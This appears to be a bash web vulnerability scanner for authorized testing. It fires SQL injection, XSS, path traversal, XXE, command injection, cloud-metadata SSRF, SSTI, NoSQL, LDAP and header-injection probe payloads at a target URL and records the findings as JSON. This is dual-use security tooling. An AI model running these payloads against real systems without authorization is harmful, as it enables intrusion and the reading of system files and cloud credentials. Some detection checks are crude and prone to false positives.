#!/bin/bash

################################################################################
# Web Application Vulnerability Scanner - Bash Edition
# For Authorized Security Testing Only
#
# LEGAL DISCLAIMER: This tool is for authorized security testing only.
# Unauthorized access to computer systems is illegal.
#
# Author: Purple Team Security Framework
# Version: 1.0
################################################################################

set -o pipefail

# Color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Global variables
TARGET_URL=""
VERBOSE=0
TIMEOUT=10
OUTPUT_FILE=""
SCAN_TYPES="all"
TOTAL_VULNS=0
CRITICAL_COUNT=0
HIGH_COUNT=0
MEDIUM_COUNT=0
LOW_COUNT=0
SCAN_START_TIME=""
SCAN_END_TIME=""
FINDINGS_FILE="/tmp/vuln_scanner_findings_$$.json"

# Initialize findings array
echo "[]" > "$FINDINGS_FILE"

################################################################################
# Helper Functions
################################################################################

print_banner() {
    echo -e "${CYAN}"
    echo "╔══════════════════════════════════════════════════════════════╗"
    echo "║     Web Application Vulnerability Scanner (Bash) v1.0       ║"
    echo "║     For Authorized Security Testing Only                    ║"
    echo "╚══════════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${YELLOW}Target: $TARGET_URL"
    echo -e "Scan Started: $(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo ""
}

log_verbose() {
    if [[ $VERBOSE -eq 1 ]]; then
        echo -e "    ${CYAN}[DEBUG]${NC} $1"
    fi
}

make_request() {
    local url="$1"
    local method="${2:-GET}"
    local data="$3"
    local response_file="/tmp/vuln_scanner_response_$$"

    log_verbose "Making $method request to: $url"

    if [[ "$method" == "GET" ]]; then
        curl -s -L -k --max-time "$TIMEOUT" \
             -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
             -w "\n%{http_code}" \
             "$url" 2>/dev/null > "$response_file"
    else
        curl -s -L -k --max-time "$TIMEOUT" \
             -A "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36" \
             -X "$method" \
             -d "$data" \
             -w "\n%{http_code}" \
             "$url" 2>/dev/null > "$response_file"
    fi

    if [[ -f "$response_file" ]]; then
        cat "$response_file"
        rm -f "$response_file"
        return 0
    else
        return 1
    fi
}

check_response() {
    local response="$1"
    shift
    local indicators=("$@")

    for indicator in "${indicators[@]}"; do
        if echo "$response" | grep -qi "$indicator"; then
            return 0
        fi
    done

    return 1
}

add_finding() {
    local attack_type="$1"
    local endpoint="$2"
    local vulnerable="$3"
    local severity="$4"
    local description="$5"
    local payload="$6"
    local evidence="$7"
    local recommendation="$8"
    local cwe="$9"
    local owasp="${10}"

    if [[ "$vulnerable" == "true" ]]; then
        TOTAL_VULNS=$((TOTAL_VULNS + 1))

        case "$severity" in
            "Critical") CRITICAL_COUNT=$((CRITICAL_COUNT + 1)) ;;
            "High") HIGH_COUNT=$((HIGH_COUNT + 1)) ;;
            "Medium") MEDIUM_COUNT=$((MEDIUM_COUNT + 1)) ;;
            "Low") LOW_COUNT=$((LOW_COUNT + 1)) ;;
        esac
    fi

    # Escape special characters for JSON
    description=$(echo "$description" | sed 's/"/\\"/g' | sed "s/'/\\'/g")
    payload=$(echo "$payload" | sed 's/"/\\"/g' | head -c 200)
    evidence=$(echo "$evidence" | sed 's/"/\\"/g' | head -c 500)
    recommendation=$(echo "$recommendation" | sed 's/"/\\"/g')

    # Create JSON entry
    local json_entry=$(cat <<EOF
{
    "attack_type": "$attack_type",
    "endpoint": "$endpoint",
    "vulnerable": $vulnerable,
    "severity": "$severity",
    "description": "$description",
    "payload": "$payload",
    "evidence": "$evidence",
    "recommendation": "$recommendation",
    "cwe": "$cwe",
    "owasp": "$owasp"
}
EOF
)

    # Append to findings file
    if command -v jq &> /dev/null; then
        jq ". += [$json_entry]" "$FINDINGS_FILE" > "${FINDINGS_FILE}.tmp" && mv "${FINDINGS_FILE}.tmp" "$FINDINGS_FILE"
    else
        # Fallback if jq not available
        echo "$json_entry" >> "${FINDINGS_FILE}.log"
    fi
}

################################################################################
# SQL Injection Scanner
################################################################################

scan_sqli() {
    echo -e "${CYAN}[1/11] Running SQL Injection scan...${NC}"

    local payloads=(
        "' OR '1'='1"
        "' OR '1'='1'--"
        "' OR 1=1--"
        "admin'--"
        "' UNION SELECT NULL--"
        "1' AND '1'='2"
    )

    local sql_errors=(
        "sql syntax"
        "mysql"
        "sqlite"
        "postgresql"
        "ora-"
        "syntax error"
        "unclosed quotation"
    )

    local endpoints=("/login/" "/search/" "/api/user/" "/dashboard/")
    local params=("q" "id" "user_id" "username" "search")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if check_response "$response" "${sql_errors[@]}"; then
                    echo -e "  ${RED}✗ SQL Injection found: $endpoint?$param=${NC}"
                    add_finding "sqli" "$url" "true" "Critical" \
                        "SQL Injection vulnerability in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | head -c 200)" \
                        "Use parameterized queries/prepared statements" \
                        "CWE-89" "A03:2021 - Injection"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No SQL injection vulnerabilities found${NC}"
        add_finding "sqli" "$TARGET_URL" "false" "Info" "No SQL injection detected" "" "" "" "" ""
    fi
}

################################################################################
# XSS Scanner
################################################################################

scan_xss() {
    echo -e "${CYAN}[2/11] Running XSS scan...${NC}"

    local payloads=(
        "<script>alert('XSS')</script>"
        "<img src=x onerror=alert('XSS')>"
        "<svg onload=alert('XSS')>"
        "'\"><script>alert(1)</script>"
    )

    local endpoints=("/comments/" "/search/" "/dashboard/")
    local params=("q" "search" "highlight" "message")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local encoded_payload=$(echo "$payload" | sed 's/ /%20/g' | sed 's/</%3C/g' | sed 's/>/%3E/g')
                local url="${TARGET_URL}${endpoint}?${param}=${encoded_payload}"
                local response=$(make_request "$url")

                # Check if payload appears unescaped
                if echo "$response" | grep -q "$payload"; then
                    echo -e "  ${RED}✗ XSS found: $endpoint?$param=${NC}"
                    add_finding "xss" "$url" "true" "High" \
                        "XSS vulnerability in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | grep -o ".{0,100}$payload.{0,100}" | head -c 200)" \
                        "Implement proper output encoding. Use CSP headers" \
                        "CWE-79" "A03:2021 - Injection"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No XSS vulnerabilities found${NC}"
        add_finding "xss" "$TARGET_URL" "false" "Info" "No XSS detected" "" "" "" "" ""
    fi
}

################################################################################
# LFI Scanner
################################################################################

scan_lfi() {
    echo -e "${CYAN}[3/11] Running LFI scan...${NC}"

    local payloads=(
        "../../../etc/passwd"
        "../../../../etc/passwd"
        "..%2f..%2f..%2fetc%2fpasswd"
        "/etc/passwd"
    )

    local indicators=(
        "root:x:0:0"
        "daemon:"
        "bin:"
    )

    local endpoints=("/download/" "/file/")
    local params=("file" "filename" "path")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if check_response "$response" "${indicators[@]}"; then
                    echo -e "  ${RED}✗ LFI found: $endpoint?$param=${NC}"
                    add_finding "lfi" "$url" "true" "High" \
                        "Local File Inclusion in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | head -c 200)" \
                        "Validate file paths. Use whitelist of allowed files" \
                        "CWE-22" "A01:2021 - Broken Access Control"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No LFI vulnerabilities found${NC}"
        add_finding "lfi" "$TARGET_URL" "false" "Info" "No LFI detected" "" "" "" "" ""
    fi
}

################################################################################
# RCE Scanner
################################################################################

scan_rce() {
    echo -e "${CYAN}[4/11] Running RCE scan...${NC}"

    local payloads=(
        "whoami"
        "id"
        "; ls"
        "| whoami"
    )

    local indicators=(
        "uid="
        "gid="
        "groups="
        "www-data"
        "root"
    )

    local endpoints=("/system-check/" "/api/exec/" "/debug/")
    local params=("cmd" "command" "exec")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if check_response "$response" "${indicators[@]}"; then
                    echo -e "  ${RED}✗ RCE found: $endpoint?$param=${NC}"
                    add_finding "rce" "$url" "true" "Critical" \
                        "Remote Code Execution in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | head -c 200)" \
                        "Never execute user input. Use input validation" \
                        "CWE-78" "A03:2021 - Injection"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No RCE vulnerabilities found${NC}"
        add_finding "rce" "$TARGET_URL" "false" "Info" "No RCE detected" "" "" "" "" ""
    fi
}

################################################################################
# SSRF Scanner
################################################################################

scan_ssrf() {
    echo -e "${CYAN}[5/11] Running SSRF scan...${NC}"

    local payloads=(
        "http://localhost"
        "http://127.0.0.1"
        "http://169.254.169.254/latest/meta-data/"
    )

    local indicators=(
        "localhost"
        "connection"
        "refused"
    )

    local endpoints=("/fetch-price/" "/api/fetch/" "/proxy/")
    local params=("url" "uri" "target")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if check_response "$response" "${indicators[@]}"; then
                    echo -e "  ${RED}✗ SSRF found: $endpoint?$param=${NC}"
                    add_finding "ssrf" "$url" "true" "High" \
                        "SSRF vulnerability in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | head -c 200)" \
                        "Validate URLs. Block private IP ranges" \
                        "CWE-918" "A10:2021 - SSRF"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No SSRF vulnerabilities found${NC}"
        add_finding "ssrf" "$TARGET_URL" "false" "Info" "No SSRF detected" "" "" "" "" ""
    fi
}

################################################################################
# XXE Scanner
################################################################################

scan_xxe() {
    echo -e "${CYAN}[6/11] Running XXE scan...${NC}"

    local payload='<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>'

    local indicators=(
        "root:x:0:0"
        "daemon:"
    )

    local endpoints=("/xml-upload/" "/api/xml/")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        local url="${TARGET_URL}${endpoint}"
        local response=$(make_request "$url" "POST" "xml=$payload")

        if check_response "$response" "${indicators[@]}"; then
            echo -e "  ${RED}✗ XXE found: $endpoint${NC}"
            add_finding "xxe" "$url" "true" "High" \
                "XXE vulnerability detected" \
                "XXE payload" \
                "$(echo "$response" | head -c 200)" \
                "Disable external entity processing" \
                "CWE-611" "A05:2021 - Security Misconfiguration"
            found=1
            break
        fi
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No XXE vulnerabilities found${NC}"
        add_finding "xxe" "$TARGET_URL" "false" "Info" "No XXE detected" "" "" "" "" ""
    fi
}

################################################################################
# SSTI Scanner
################################################################################

scan_ssti() {
    echo -e "${CYAN}[7/11] Running SSTI scan...${NC}"

    local payloads=(
        "{{7*7}}"
        "{{7*'7'}}"
        "\${7*7}"
    )

    local endpoints=("/render/" "/template/")
    local params=("template" "name" "content")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            # Test {{7*7}} = 49
            local url="${TARGET_URL}${endpoint}?${param}={{7*7}}"
            local response=$(make_request "$url")

            if echo "$response" | grep -q "49"; then
                echo -e "  ${RED}✗ SSTI found: $endpoint?$param=${NC}"
                add_finding "ssti" "$url" "true" "High" \
                    "SSTI vulnerability in $param parameter" \
                    "{{7*7}}" \
                    "$(echo "$response" | grep -o ".{0,50}49.{0,50}" | head -c 200)" \
                    "Never render user-controlled templates" \
                    "CWE-94" "A03:2021 - Injection"
                found=1
                break
            fi
        done
        [[ $found -eq 1 ]] && break
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No SSTI vulnerabilities found${NC}"
        add_finding "ssti" "$TARGET_URL" "false" "Info" "No SSTI detected" "" "" "" "" ""
    fi
}

################################################################################
# NoSQL Injection Scanner
################################################################################

scan_nosqli() {
    echo -e "${CYAN}[8/11] Running NoSQL Injection scan...${NC}"

    local payloads=(
        '{"$ne":null}'
        '{"$gt":""}'
    )

    local endpoints=("/api/nosql/" "/api/search/")
    local params=("username" "query")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if echo "$response" | grep -qi "results\|_id"; then
                    echo -e "  ${RED}✗ NoSQL Injection found: $endpoint?$param=${NC}"
                    add_finding "nosqli" "$url" "true" "High" \
                        "NoSQL Injection in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | head -c 200)" \
                        "Validate input. Use schema validation" \
                        "CWE-943" "A03:2021 - Injection"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No NoSQL injection found${NC}"
        add_finding "nosqli" "$TARGET_URL" "false" "Info" "No NoSQLi detected" "" "" "" "" ""
    fi
}

################################################################################
# LDAP Scanner
################################################################################

scan_ldap() {
    echo -e "${CYAN}[9/11] Running LDAP Injection scan...${NC}"

    local payloads=(
        "*"
        "*)(uid=*"
        "admin)(|(password=*))"
    )

    local endpoints=("/ldap/" "/api/ldap/")
    local params=("username" "user")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if echo "$response" | grep -qi "filter\|uid=\|ldap"; then
                    echo -e "  ${RED}✗ LDAP Injection found: $endpoint?$param=${NC}"
                    add_finding "ldap" "$url" "true" "Medium" \
                        "LDAP Injection in $param parameter" \
                        "$payload" \
                        "$(echo "$response" | head -c 200)" \
                        "Escape LDAP special characters" \
                        "CWE-90" "A03:2021 - Injection"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No LDAP injection found${NC}"
        add_finding "ldap" "$TARGET_URL" "false" "Info" "No LDAP detected" "" "" "" "" ""
    fi
}

################################################################################
# GraphQL Scanner
################################################################################

scan_graphql() {
    echo -e "${CYAN}[10/11] Running GraphQL scan...${NC}"

    local query='{"query": "{ __schema { types { name } } }"}'

    local endpoints=("/graphql/" "/api/graphql/")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        local url="${TARGET_URL}${endpoint}"
        local response=$(make_request "$url" "POST" "$query")

        if echo "$response" | grep -q "__schema"; then
            echo -e "  ${RED}✗ GraphQL introspection enabled: $endpoint${NC}"
            add_finding "graphql" "$url" "true" "Medium" \
                "GraphQL introspection enabled" \
                "Introspection query" \
                "$(echo "$response" | head -c 200)" \
                "Disable introspection in production" \
                "CWE-200" "A01:2021 - Broken Access Control"
            found=1
            break
        fi
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No GraphQL issues found${NC}"
        add_finding "graphql" "$TARGET_URL" "false" "Info" "No GraphQL issues" "" "" "" "" ""
    fi
}

################################################################################
# Header Injection Scanner
################################################################################

scan_headers() {
    echo -e "${CYAN}[11/11] Running Header Injection scan...${NC}"

    local payloads=(
        "%0d%0aX-Injected: true"
        "\\r\\nX-Injected: true"
    )

    local endpoints=("/reset-password/" "/logout/")
    local params=("email" "redirect")
    local found=0

    for endpoint in "${endpoints[@]}"; do
        for param in "${params[@]}"; do
            for payload in "${payloads[@]}"; do
                local url="${TARGET_URL}${endpoint}?${param}=${payload}"
                local response=$(make_request "$url")

                if echo "$response" | grep -qi "x-injected"; then
                    echo -e "  ${RED}✗ Header Injection found: $endpoint?$param=${NC}"
                    add_finding "header_injection" "$url" "true" "Medium" \
                        "Header Injection in $param parameter" \
                        "$payload" \
                        "Header injection detected" \
                        "Sanitize input before using in headers" \
                        "CWE-113" "A03:2021 - Injection"
                    found=1
                    break
                fi
            done
            [[ $found -eq 1 ]] && break
        done
    done

    if [[ $found -eq 0 ]]; then
        echo -e "  ${GREEN}✓ No header injection found${NC}"
        add_finding "header_injection" "$TARGET_URL" "false" "Info" "No header injection" "" "" "" "" ""
    fi
}

################################################################################
# Report Generation
################################################################################

print_summary() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
    echo "║                     SCAN SUMMARY                             ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}Total Vulnerabilities Found: $TOTAL_VULNS${NC}"
    echo ""
    echo -e "${RED}  Critical: $CRITICAL_COUNT${NC}"
    echo -e "${MAGENTA}  High:     $HIGH_COUNT${NC}"
    echo -e "${YELLOW}  Medium:   $MEDIUM_COUNT${NC}"
    echo -e "${CYAN}  Low:      $LOW_COUNT${NC}"
    echo ""

    local duration=$(($(date +%s) - SCAN_START_TIME))
    echo -e "${CYAN}Scan Duration: ${duration}s${NC}"
}

generate_json_report() {
    local output="$1"

    if command -v jq &> /dev/null; then
        cat > "$output" <<EOF
{
  "scan_info": {
    "target": "$TARGET_URL",
    "scan_start": "$(date -d @$SCAN_START_TIME '+%Y-%m-%dT%H:%M:%S' 2>/dev/null || date -r $SCAN_START_TIME '+%Y-%m-%dT%H:%M:%S')",
    "scan_end": "$(date '+%Y-%m-%dT%H:%M:%S')",
    "duration_seconds": $(($(date +%s) - SCAN_START_TIME))
  },
  "summary": {
    "total_vulnerabilities": $TOTAL_VULNS,
    "critical": $CRITICAL_COUNT,
    "high": $HIGH_COUNT,
    "medium": $MEDIUM_COUNT,
    "low": $LOW_COUNT
  },
  "vulnerabilities": $(cat "$FINDINGS_FILE")
}
EOF

        # Format JSON
        jq '.' "$output" > "${output}.tmp" && mv "${output}.tmp" "$output"
        echo -e "${GREEN}Report exported to: $output${NC}"
    else
        echo -e "${YELLOW}jq not installed. Creating basic JSON report...${NC}"
        cat "$FINDINGS_FILE" > "$output"
        echo -e "${GREEN}Basic report exported to: $output${NC}"
    fi
}

################################################################################
# Interactive Input Functions
################################################################################

get_target_url() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
    echo "║              Target Configuration                            ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    while true; do
        echo -e "${YELLOW}Please enter the target URL or IP to scan:${NC}"
        echo -e "${CYAN}Examples:${NC}"
        echo "  - http://example.com"
        echo "  - https://192.168.1.100"
        echo "  - http://your-target.com"
        echo ""
        read -p "Target URL/IP: " TARGET_URL

        # Remove trailing slash
        TARGET_URL="${TARGET_URL%/}"

        # Validate input
        if [[ -z "$TARGET_URL" ]]; then
            echo -e "${RED}Error: Target URL cannot be empty!${NC}"
            echo ""
            continue
        fi

        # Add http:// if no protocol specified
        if [[ ! "$TARGET_URL" =~ ^https?:// ]]; then
            TARGET_URL="http://$TARGET_URL"
            echo -e "${YELLOW}Note: Added http:// prefix -> $TARGET_URL${NC}"
        fi

        echo -e "${GREEN}✓ Target set: $TARGET_URL${NC}"
        break
    done
}

get_scan_types() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
    echo "║              Select Scan Types                               ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo "Available scan types:"
    echo ""
    echo -e "  ${RED}[1]${NC} All scans (recommended)"
    echo -e "  ${YELLOW}[2]${NC} SQL Injection only"
    echo -e "  ${YELLOW}[3]${NC} XSS only"
    echo -e "  ${YELLOW}[4]${NC} LFI only"
    echo -e "  ${YELLOW}[5]${NC} RCE only"
    echo -e "  ${YELLOW}[6]${NC} SSRF only"
    echo -e "  ${YELLOW}[7]${NC} All injection attacks (SQLi, XSS, SSTI, NoSQLi)"
    echo -e "  ${YELLOW}[8]${NC} Custom selection"
    echo ""

    read -p "Select option [1-8] (default: 1): " scan_choice
    scan_choice=${scan_choice:-1}

    case $scan_choice in
        1)
            SCAN_TYPES="all"
            echo -e "${GREEN}✓ Running all scans${NC}"
            ;;
        2)
            SCAN_TYPES="sqli"
            echo -e "${GREEN}✓ Running SQL Injection scan${NC}"
            ;;
        3)
            SCAN_TYPES="xss"
            echo -e "${GREEN}✓ Running XSS scan${NC}"
            ;;
        4)
            SCAN_TYPES="lfi"
            echo -e "${GREEN}✓ Running LFI scan${NC}"
            ;;
        5)
            SCAN_TYPES="rce"
            echo -e "${GREEN}✓ Running RCE scan${NC}"
            ;;
        6)
            SCAN_TYPES="ssrf"
            echo -e "${GREEN}✓ Running SSRF scan${NC}"
            ;;
        7)
            SCAN_TYPES="sqli,xss,ssti,nosqli"
            echo -e "${GREEN}✓ Running all injection scans${NC}"
            ;;
        8)
            echo ""
            echo "Enter scan types separated by commas:"
            echo "Available: sqli, xss, lfi, rce, ssrf, xxe, ssti, nosqli, ldap, graphql, headers"
            echo ""
            read -p "Types: " SCAN_TYPES
            echo -e "${GREEN}✓ Custom scan types: $SCAN_TYPES${NC}"
            ;;
        *)
            SCAN_TYPES="all"
            echo -e "${YELLOW}Invalid choice, using 'all'${NC}"
            ;;
    esac
}

get_options() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
    echo "║              Scan Options                                    ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Verbose mode
    read -p "Enable verbose mode? (y/n, default: n): " verbose_choice
    if [[ "$verbose_choice" =~ ^[Yy]$ ]]; then
        VERBOSE=1
        echo -e "${GREEN}✓ Verbose mode enabled${NC}"
    else
        VERBOSE=0
        echo -e "${GREEN}✓ Normal mode${NC}"
    fi

    echo ""

    # Output file
    read -p "Save results to JSON file? (y/n, default: n): " output_choice
    if [[ "$output_choice" =~ ^[Yy]$ ]]; then
        read -p "Enter output filename (default: scan_results.json): " OUTPUT_FILE
        OUTPUT_FILE=${OUTPUT_FILE:-scan_results.json}
        echo -e "${GREEN}✓ Results will be saved to: $OUTPUT_FILE${NC}"
    else
        OUTPUT_FILE=""
        echo -e "${GREEN}✓ No file output${NC}"
    fi

    echo ""

    # Timeout
    read -p "Request timeout in seconds (default: 10): " timeout_input
    TIMEOUT=${timeout_input:-10}
    echo -e "${GREEN}✓ Timeout set to: ${TIMEOUT}s${NC}"
}

show_summary_and_confirm() {
    echo ""
    echo -e "${CYAN}╔══════════════════════════════════════════════════════════════╗"
    echo "║              Scan Configuration Summary                      ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "  ${CYAN}Target:${NC}       $TARGET_URL"
    echo -e "  ${CYAN}Scan Types:${NC}   $SCAN_TYPES"
    echo -e "  ${CYAN}Verbose:${NC}      $([ $VERBOSE -eq 1 ] && echo 'Yes' || echo 'No')"
    echo -e "  ${CYAN}Output File:${NC}  $([ -n "$OUTPUT_FILE" ] && echo "$OUTPUT_FILE" || echo 'None')"
    echo -e "  ${CYAN}Timeout:${NC}      ${TIMEOUT}s"
    echo ""

    read -p "Continue with scan? (y/n): " confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${YELLOW}Scan cancelled by user.${NC}"
        exit 0
    fi
}

################################################################################
# Main Function
################################################################################

main() {
    clear

    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗"
    echo "║                                                              ║"
    echo "║       Web Application Vulnerability Scanner (Bash)          ║"
    echo "║       For Authorized Security Testing Only                  ║"
    echo "║                                                              ║"
    echo -e "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Get target URL
    get_target_url

    # Get scan types
    get_scan_types

    # Get options
    get_options

    # Show summary and confirm
    show_summary_and_confirm

    # Legal disclaimer
    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗"
    echo "║                    LEGAL DISCLAIMER                          ║"
    echo "╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${RED}This tool is for AUTHORIZED security testing only."
    echo "Unauthorized access to computer systems is illegal."
    echo "By continuing, you confirm that you have proper authorization."
    echo -e "${NC}"

    read -p "I have authorization to scan $TARGET_URL (yes/no): " response
    if [[ ! "$response" =~ ^[Yy][Ee][Ss]$ ]]; then
        echo ""
        echo -e "${RED}✗ Scan cancelled. Authorization required.${NC}"
        exit 1
    fi

    echo -e "${GREEN}✓ Authorization confirmed${NC}"

    # Start scan
    SCAN_START_TIME=$(date +%s)
    print_banner

    # Run scans
    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"sqli"* ]]; then
        scan_sqli
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"xss"* ]]; then
        scan_xss
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"lfi"* ]]; then
        scan_lfi
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"rce"* ]]; then
        scan_rce
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"ssrf"* ]]; then
        scan_ssrf
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"xxe"* ]]; then
        scan_xxe
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"ssti"* ]]; then
        scan_ssti
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"nosqli"* ]]; then
        scan_nosqli
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"ldap"* ]]; then
        scan_ldap
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"graphql"* ]]; then
        scan_graphql
    fi

    if [[ "$SCAN_TYPES" == "all" ]] || [[ "$SCAN_TYPES" == *"headers"* ]]; then
        scan_headers
    fi

    # Print summary
    print_summary

    # Generate report if requested
    if [[ -n "$OUTPUT_FILE" ]]; then
        generate_json_report "$OUTPUT_FILE"
    fi

    # Cleanup
    rm -f "$FINDINGS_FILE" "${FINDINGS_FILE}.tmp" "${FINDINGS_FILE}.log"
}

# Run main function
main
